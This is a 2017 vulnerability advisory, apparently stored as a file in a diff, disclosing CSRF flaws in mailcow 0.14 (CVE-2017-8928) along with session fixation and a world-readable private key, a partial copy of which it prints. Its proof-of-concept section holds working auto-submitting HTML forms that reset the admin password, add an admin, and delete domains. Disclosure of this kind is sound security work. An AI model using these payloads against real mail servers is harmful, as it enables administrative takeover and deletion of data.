@@ -1,0 +1,154 @@
+[+] Credits: John Page a.k.a hyp3rlinx	
+[+] Website: hyp3rlinx.altervista.org
+[+] Source:  http://hyp3rlinx.altervista.org/advisories/MAILCOW-v0.14-CSRF-PASSWORD-RESET-ADD-ADMIN.txt
+[+] ISR: ApparitionSec            
+ 
+
+
+Vendor:
+=============
+mailcow.email
+mailcow.github.io
+
+
+
+Product:
+===========
+The integrated mailcow UI allows administrative work on your mail server instance as well as separated domain administrator and mailbox user access.
+
+
+
+Vulnerability Type:
+===================
+CSRF
+Password Reset / Add Admin / Delete Domains
+
+
+
+CVE Reference:
+==============
+CVE-2017-8928
+
+
+
+Security Issue:
+================
+mailcow 0.14, as used in "mailcow: dockerized" and other products, has CSRF vulnerabilities. If authenticated mailcow user visits a malicious webpage
+remote attackers can execute the following exploits.
+
+
+1) reset admin password
+2) add arbitrary admin
+3) delete domains
+
+
+
+Other issues found in mailcow are as follows:
+
+Session fixation:
+=================
+Session ID: Pre authentication and Post auth is the same, and does not change upon successful login.
+
+ms22jsnl1dcpc4519rvpvfj0n6 - pre-authentication
+ms22jsnl1dcpc4519rvpvfj0n6 - post-authentication
+
+
+World Readable Private key "key.pem"
+====================================
+john@debian:/usr/local/mailcow-dockerized-master/data/assets/ssl$ whoami
+
+john
+
+john@debian:/usr/local/mailcow-dockerized-master/data/assets/ssl$ cat key.pem 
+
+-----BEGIN RSA PRIVATE KEY-----
+MIIEpAIBAAKCAQEA0YNMU9wLfQ0m9x+TjKdytTKVwIGMqLUiuk0utXwtEBB8tnzF
+4sLOwIHMnui5+whutxXtXjdo5HZXn8vcSYr0vMucNDPItevL+c58wvH58pS9ojok
+mHyvwf6BKn1O2B+EXHoDud6AwyFGZouBa4J7u9/VVTlNWchxFahidh9mgCJKGUYx
+s7pg/WJuC1honbSicwYBbf6poVHll4qTPMNvNV5EJyVO/fsdssJyUrxGd6/2VSQu
+5G44lcPv5NeZPQsZOiJPMJidF//sVsaGaJh0CNSzNFSgEv4mlPeXZ9m6Zby+o04o
+slgG6zI0irOF2z7f3yGzonDZI+vghctDFX8shwIDAQABAoIBAQC9kiLnIgxXGyZt
+pmmYdA6re1jatZ2zLSp+DcY8ul3/0hs195IKCyCOOSQPiR520Pt0t+duP46uYZIJ
+
+etc...
+
+
+References:
+============
+https://github.com/mailcow/mailcow-dockerized/pull/268/commits/3c937f75ba5853ada175542d5c4849fb95eb64cd
+
+
+
+Exploit/POC:
+=============
+
+[Admin Password Reset]
+
+<form action="https://localhost/admin.php" method="post">
+<input type="hidden" name="admin_user_now" value="admin">
+<input type="hidden" name="admin_user" value="admin">
+<input type="hidden" name="admin_pass" value="Abc12345">
+<input type="hidden" name="admin_pass2" value="Abc12345">
+<input type="hidden" name="trigger_set_admin" value="">
+<script>document.forms[0].submit()</script>
+</form>
+
+
+HTTP Response:
+
+'Changes to administrator have been saved"
+
+//////////////////////
+
+
+[Add Admin]
+
+<form action="https://localhost/admin.php" method="post">
+<input type="hidden" name="username" value="HELL">
+<input type="hidden" name="password" value="Abc12345">
+<input type="hidden" name="password2" value="Abc12345">
+<input type="hidden" name="active" value="on">
+<input type="hidden" name="trigger_add_domain_admin" value="localhost">
+<script>document.forms[0].submit()</script>
+</form>
+
+
+////////////////////
+
+
+[Delete domains]
+
+https://localhost/mailbox.php
+domain=myDomain&trigger_mailbox_action=deletedomain
+
+
+
+Network Access:
+===============
+Remote
+
+
+
+Severity:
+=========
+Medium
+
+
+
+Disclosure Timeline:
+=================================
+Vendor Notification:  May 6, 2017
+Vendor releases fix:  May 6, 2017
+May 14, 2017  : Public Disclosure
+
+
+
+[+] Disclaimer
+The information contained within this advisory is supplied "as-is" with no warranties or guarantees of fitness of use or otherwise.
+Permission is hereby granted for the redistribution of this advisory, provided that it is not altered except by reformatting it, and
+that due credit is given. Permission is explicitly given for insertion in vulnerability databases and similar, provided that due credit
+is given to the author. The author is not responsible for any misuse of the information contained herein and accepts no responsibility
+for any damage caused by the use or misuse of this information. The author prohibits any malicious use of security related information
+or exploits by the author or elsewhere. All content (c).
+
+hyp3rlinx
